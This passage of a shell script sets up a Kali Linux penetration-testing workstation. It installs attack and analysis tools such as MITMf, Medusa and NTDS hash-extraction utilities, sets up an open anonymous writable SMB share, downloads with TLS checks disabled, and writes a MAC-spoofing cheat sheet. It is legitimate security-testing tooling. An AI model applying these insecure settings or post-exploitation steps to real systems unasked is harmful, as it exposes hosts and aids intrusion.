apt-get -y -qq install mitmf || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
dpkg --configure -a

##### Configure Shutter
# shutter -f -C -e      Shutter Full Screen
# shutter -a -C -e      Shutter Active Window 


##### Install random dependencies for scripts
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}random dependencies for scripts${RESET} ~ random stuff"
#*** I know its messy...
for FILE in conntrack rwho x11-apps finger xsltproc; do
  apt-get -y -qq install "${FILE}" 2>/dev/null
  dpkg --configure -a
done
pip install xlrd --upgrade
 

##### Install python dependencies
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}python dependencies${RESET} ~ compiling libraries"
#*** I know its messy...
for FILE in python-libpcap python-elixir python-support python-ipy python-glade2 python-dnspython python-geoip python-whois python-requests python-ssdeep python-ldap python-setuptools python-pip; do
  apt-get -y -qq install "${FILE}" 2>/dev/null
  dpkg --configure -a
done
pip install github3.py


##### Install Sublime Text
# x86
apt-get -y -qq install curl || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
dpkg --configure -a
if [ $proc == 32 ]; then 
  curl --progress -k -L -f "wget http://c758482.r82.cf2.rackcdn.com/sublime-text_build-3083_i386.deb" > /tmp/sublimetext.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading Sublime Text" 1>&2   #***!!! hardcoded version! Need to manually check for updates
# x64
elif [ $proc == 64 ]; then
  curl --progress -k -L -f "http://c758482.r82.cf2.rackcdn.com/sublime-text_build-3083_amd64.deb" > /tmp/sublimetext.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading Sublime Text" 1>&2   #***!!! hardcoded version! Need to manually check for updates
fi
dpkg -i /tmp/sublimetext.deb


##### Install Shareenum
# x86
if [ $proc == 32 ]; then 
  curl --progress -k -L -f "https://github.com/CroweCybersecurity/shareenum/releases/download/2.0/shareenum_2.0_i386.deb" > /tmp/shareenum.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading Shareenum" 1>&2   #***!!! hardcoded version! Need to manually check for updates
elif [ $proc == 64 ]; then 
  curl --progress -k -L -f "https://github.com/CroweCybersecurity/shareenum/releases/download/2.0/shareenum_2.0_amd64.deb" > /tmp/shareenum.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading Shareenum" 1>&2   #***!!! hardcoded version! Need to manually check for updates
fi
dpkg -i /tmp/shareenum.deb



##### Install Github repos
chmod +x github_clone.sh
./github_clone.sh


################################ Install Work Specific Tools ################################
##### Install John the Ripper Community Enhanced Version
apt-get -y -qq install curl libssl-dev openssl || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
dpkg --configure -a
#if [ $arm == 0 ]; then 
#  curl --progress -k -L -f "http://www.openwall.com/john/j/john-1.8.0-jumbo-1.tar.gz" > /tmp/john-1.8.0-jumbo-1.tar.gz || echo -e ' '${RED}'[!]'${RESET}" Issue downloading JTR Community" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  cd /tmp
#  tar xzvf john-1.8.0-jumbo-1.tar.gz
#  cd john-1.8.0-jumbo-1/src
#  ./configure
#  make clean && make -s
#  make && make install
#  mv /usr/sbin/john /usr/sbin/john.bak
#  cd ../run
#  cp john /usr/sbin/john
# 
#  # Optional
#  #john --test
#fi

#apt-get --reinstall install john

##### Install Work Specific Scripts
# Github download
cd $gitdir
git clone https://jbarcia@github.com/jbarcia/Crowe-Scripts.git
mkdir /toolslinux                                              
ln -s /root/github/Crowe-Scripts/pen-tools/Linux/* /toolslinux/
ln -s /root/github/Crowe-Scripts/pen-tools /
# Crowe Medusa v2.2_rc2
if [ $arm == 0 ]; then 
  cp /toolslinux/passwords/medusa/Crowe_Medusa-2.2_rc2.zip /tmp/
  cd /tmp
  unzip Crowe_Medusa-2.2_rc2.zip
  cd root/medusa-2.2_rc2/
  ./configure && make && make install
fi
# NTDS_EXTRACT
if [ ! -d "~/NTDS_EXTRACT" ]; then
  mkdir ~/NTDS_EXTRACT
  cd ~/NTDS_EXTRACT
  cp /toolsv3/Assessment/_Post-Exploitation/VSS/libesedb-alpha-20120102.tar.gz ~/NTDS_EXTRACT/
  cp /toolsv3/Assessment/_Post-Exploitation/VSS/ntdsxtract_v1_0.zip ~/NTDS_EXTRACT/
  cp /toolsv3/Assessment/_Post-Exploitation/VSS/dshashes.py ~/NTDS_EXTRACT/
  tar zxvf libesedb-alpha-20120102.tar.gz
  unzip ntdsxtract_v1_0.zip
  cp dshashes.py NTDSXtract\ 1.0/dshashes.py
  cd libesedb-20120102
  chmod +x configure
  ./configure && make
fi


###### Android Hacking Tools
apt-get -y -qq install python-protobuf || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
cd /tmp
#wget https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer_2.3.4.deb
#dpkg -i drozer_2.3.4.deb

wget https://dl.google.com/dl/android/studio/ide-zips/2.2.0.12/android-studio-ide-145.3276617-linux.zip
unzip android-studio-ide-145.3276617-linux.zip
mv android-studio /usr/local/android-studio
ln -s /usr/local/android-studio/bin/studio.sh /usr/bin/androidstudio

wget https://dl.google.com/android/android-sdk_r24.4.1-linux.tgz
tar -xvzf android-sdk_r24.4.1-linux.tgz
mv android-sdk-linux /usr/local/android-sdk-linux
ln -s /usr/local/android-sdk-linux/tools/android /usr/bin/android
# android list sdk --all
android update sdk -u -a -t 1,2,3
ln -s /usr/local/android-sdk-linux/platform-tools/adb /usr/bin/adb
ln -s /usr/local/android-sdk-linux/build-tools/24.0.2/aapt /usr/bin/aapt
ln -s /usr/local/android-sdk-linux/build-tools/24.0.2/dexdump /usr/bin/dexdump

wget https://github.com/skylot/jadx/releases/download/v0.6.0/jadx-0.6.0.zip
unzip jadx-0.6.0.zip -d jadx
mv jadx /usr/local/jadx
ln -s /usr/local/jadx/bin/jadx /usr/bin/jadx
ln -s /usr/local/jadx/bin/jadx-gui /usr/bin/jadx-gui

mkdir ~/AndroidTools
cd ~/AndroidTools
wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/android4me/AXMLPrinter2.jar
wget https://bitbucket.org/JesusFreke/smali/downloads/smali-2.1.3.jar
wget https://bitbucket.org/JesusFreke/smali/downloads/baksmali-2.1.3.jar
# wget http://downloads.sourceforge.net/project/dex2jar/dex2jar-2.0.zip
# unzip dex2jar-2.0.zip
wget https://github.com/java-decompiler/jd-gui/releases/download/v1.4.0/jd-gui-1.4.0.jar



###### Docker Setup
# update apt-get
export DEBIAN_FRONTEND="noninteractive"
sudo apt-get update

# remove previously installed Docker
sudo apt-get purge lxc-docker*
sudo apt-get purge docker.io*

# add Docker repo
sudo apt-get install -y apt-transport-https ca-certificates
sudo apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D

cat > /etc/apt/sources.list.d/docker.list <<'EOF'
deb https://apt.dockerproject.org/repo debian-stretch main
EOF
sudo apt-get update

# install Docker
sudo apt-get install -y docker-engine
sudo service docker start
#sudo docker run hello-world


# configure Docker user group permissions
sudo groupadd docker
sudo gpasswd -a ${USER} docker
sudo service docker restart

# set Docker to auto-launch on startup
sudo systemctl enable docker


cat > /usr/bin/docker-pid <<'EOF'
#!/bin/sh
exec docker inspect --format '{{ .State.Pid }}' "$@"
EOF
chmod +x /usr/bin/docker-pid

cat > /usr/bin/docker-ip <<'EOF'
#!/bin/sh
exec docker inspect --format '{{ .NetworkSettings.IPAddress }}' "$@"
EOF
chmod +x /usr/bin/docker-ip
#############################################################################################



###### Loki Setup
#apt-get -y -qq install curl || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
#if [ $arm == 0 ]; then 
#  apt-get -y remove python-libpcap
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/python-central_0.6.17ubuntu2_all.deb" > /tmp/python-central_0.6.17ubuntu2_all.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading python-central_0.6.17ubuntu2_all.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  cd /tmp
#  dpkg -i python-central_0.6.17ubuntu2_all.deb
#fi
## x86
#if [ $proc == 32 ]; then 
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/libssl0.9.8_0.9.8o-7_i386.deb" > /tmp/libssl0.9.8_0.9.8o-7_i386.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading libssl0.9.8_0.9.8o-7_i386.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/python-dpkt_1.6+svn54-1_all.deb" > /tmp/python-dpkt_1.6+svn54-1_all.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading python-dpkt_1.6+svn54-1_all.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/python-dumbnet_1.12-3.1_i386.deb" > /tmp/python-dumbnet_1.12-3.1_i386.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading python-dumbnet_1.12-3.1_i386.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/pylibpcap_0.6.2-1_i386.deb" > /tmp/pylibpcap_0.6.2-1_i386.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading pylibpcap_0.6.2-1_i386.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/loki_0.2.7-1_i386.deb" > /tmp/loki_0.2.7-1_i386.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading loki_0.2.7-1_i386.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  dpkg -i libssl0.9.8_0.9.8o-7_i386.deb python-dpkt_1.6+svn54-1_all.deb python-dumbnet_1.12-3.1_i386.deb pylibpcap_0.6.2-1_i386.deb
#  dpkg –i loki_0.2.7-1_i386.deb
## x64
#elif [ $proc == 64 ]; then
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/libssl0.9.8_0.9.8o-7_amd64.deb" > /tmp/libssl0.9.8_0.9.8o-7_amd64.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading libssl0.9.8_0.9.8o-7_amd64.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/python-dpkt_1.6+svn54-1_all.deb" > /tmp/python-dpkt_1.6+svn54-1_all.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading python-dpkt_1.6+svn54-1_all.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/python-dumbnet_1.12-3.1_amd64.deb" > /tmp/python-dumbnet_1.12-3.1_amd64.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading python-dumbnet_1.12-3.1_amd64.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/pylibpcap_0.6.2-1_amd64.deb" > /tmp/pylibpcap_0.6.2-1_amd64.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading pylibpcap_0.6.2-1_amd64.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/libcap-dev_2.22-1.2_amd64.deb" > /tmp/libcap-dev_2.22-1.2_amd64.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading libcap-dev_2.22-1.2_amd64.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/libpcap0.8-dev_1.3.0-1_amd64.deb" > /tmp/libpcap0.8-dev_1.3.0-1_amd64.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading libpcap0.8-dev_1.3.0-1_amd64.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/loki_0.2.7-1_amd64.deb" > /tmp/loki_0.2.7-1_amd64.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading loki_0.2.7-1_amd64.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#
#  dpkg -i libssl0.9.8_0.9.8o-7_amd64.deb python-dpkt_1.6+svn54-1_all.deb python-dumbnet_1.12-3.1_amd64.deb pylibpcap_0.6.2-1_amd64.deb libcap-dev_2.22-1.2_amd64.deb libpcap0.8-dev_1.3.0-1_amd64.deb
#  dpkg -i loki_0.2.7-1_amd64.deb
#fi

##### Install 32 bit libraries for wmic.py
#if [ $proc == 64 ]; then 
#  dpkg --add-architecture i386
#  apt-get update
#  apt-get install ia32-libs
#  cp pth-wmi/kaliwmis-32 /usr/sbin/kaliwmis-32
#fi

#############################################################################################


#### Setup Anonymous SMB
smbpasswd -an nobody
mkdir -p /mnt/smb

sed -i 's/\[Global\]/\[Global\] \n guest account = nobody \n map to guest = bad user/I' smb.conf

cat <<EOF >> /etc/samba/smb.conf

[AnonShare]
 comment = Guest access share
 path = /mnt/smb
 browseable = yes
 writable = yes
 read only = no
 guest ok = yes

EOF

chmod -R a+rwx /mnt/smb
service smbd restart
service nmbd restart

#### Desktop Network File
cat <<EOF > /etc/profile.d/screensaver_off.sh

#!/bin/bash
sleep 2; xset s off
sleep 2; xset s noblank
sleep 2; xset -dpms
EOF

chmod +x /etc/profile.d/screensaver_off.sh

#### Desktop Network File
cat <<EOF > /root/Desktop/Network.txt
----------------------------------------------------------------------------
macchanger -l|grep -i Cisco
macchanger -l|grep -i VMWare
----------------------------------------------------------------------------
DHCP
ifconfig <interface> down
macchanger --mac=XX:XX:XX:XX:XX:XX <interface>
ifconfig <interface> up
dhclient <interface>
----------------------------------------------------------------------------
STATIC
ifconfig <interface> down
macchanger --mac=XX:XX:XX:XX:XX:XX <interface>
ifconfig <interface> <IP_Address> netmask 255.255.255.0 broadcast <IP_Address>.255
echo "nameserver <DNS_SERVER>" >> /etc/resolv.conf
route add default gw <GATEWAY_Address>
ifconfig <interface> up
----------------------------------------------------------------------------
CONKY
ps aux | grep conky
kill -9 1092
conky &
----------------------------------------------------------------------------
WEB CONTENT
/usr/share/mana-toolkit/www/portal/
----------------------------------------------------------------------------
GITHUB
git clone 'http://.git'
git clone 'git@github.com:<Username>/<Project>.git'

git remote set-url origin git@github.com:<Username>/<Project>.git

git commit -a -m 'COMMENT'
git push

git pull

git stash
git reset --hard HEAD
----------------------------------------------------------------------------
DOCKER
docker run -d --name <NAME> -p <IP ADDRESS>:80:80
docker stop <DOCKER CONTAINER>
docker restart <DOCKER CONTAINER>
docker rm <DOCKER CONTAINER>

docker-pid <DOCKER CONTAINER>
docker-ip <DOCKER CONTAINER>

MATTERMOST CHAT
docker pull mattermost/mattermost-preview
docker run --name mattermost -d --restart=always --publish <IP ADDRESS>:8065:8065 mattermost/mattermost-preview
http://localhost:8065/


Bloodhound
docker pull neo4j
docker run --name neo4j -d --restart=always -p 127.0.0.1:7474:7474 -p 127.0.0.1:7687:7687 neo4j

----------------------------------------------------------------------------
EOF

updatedb

echo -e '\n'${YELLOW}''${BOLD}'Configure Shutter Screenshot directory'${RESET}'\n\a'
echo -e '\n'${YELLOW}''${BOLD}'Configure PrntScrn Keyboard Shortcuts -> System-tools-->preferences-->System Setting--> Keyboard'${RESET}'\n\a'
echo -e '\n'${BLUE}''${BOLD}'           --> shutter -f -C -e      Shutter Full Screen'${RESET}'\n\a'
echo -e '\n'${BLUE}''${BOLD}'           --> shutter -a -C -e      Shutter Active Window'${RESET}'\n\a'
echo -e '\n'${YELLOW}''${BOLD}'Disable Network Connections'${RESET}'\n\a'
echo -e '\n'${BLUE}''${BOLD}'           --> Edit Connections --> General --> Auto Connect to this network'${RESET}'\n\a'
echo -e '\n'${YELLOW}''${BOLD}'Check NMAP Aliases'${RESET}'\n\a'
echo -e '\n'${BLUE}''${BOLD}'           --> .bash_aliases'${RESET}'\n\a'.bash_aliases
echo -e '\n'${BLUE}'[*]'${RESET}' '${BOLD}'Done!'${RESET}'\n\a'
exit 0
